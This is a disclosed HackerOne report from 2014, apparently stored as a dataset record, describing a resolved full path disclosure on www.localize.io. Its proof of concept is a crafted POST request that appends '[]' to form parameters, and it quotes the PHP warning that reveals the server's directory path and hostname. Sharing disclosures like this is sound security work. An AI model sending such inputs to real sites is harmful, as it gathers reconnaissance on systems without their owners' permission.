---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '8088'
original_report_id: '8088'
title: Full Path Disclosure (FPD) in www.localize.io
weakness: Information Disclosure
team_handle: localize
created_at: '2014-04-19T01:41:31.943Z'
disclosed_at: '2014-04-19T02:38:10.497Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- information-disclosure
---

# Full Path Disclosure (FPD) in www.localize.io

## Metadata

- HackerOne Report ID: 8088
- Weakness: Information Disclosure
- Program: localize
- Disclosed At: 2014-04-19T02:38:10.497Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,
I found an information disclosure vulnerability/Full Path Disclosure on your application.

Proof of Concept
-------------------------

GET  : http://www.localize.io/pages/create_project/ [project ID]
POST CONTENT: CSRFToken=TOKEN VALUE&create_project[visibility]=1&create_project[name][]=My+Android&create_project[defaultLanguage]=1&create_project[editRepositoryID][]=72

Just Add "[]" after *create_project[name]* and *create_project[editRepositoryID]*

### The information from page:
> Warning: trim() expects parameter 1 to be string, array given in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/classes/UI.php on line 1495

I Also Added a Screenshot of that FPD as attachment..
Hope You'll fix this one..
Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
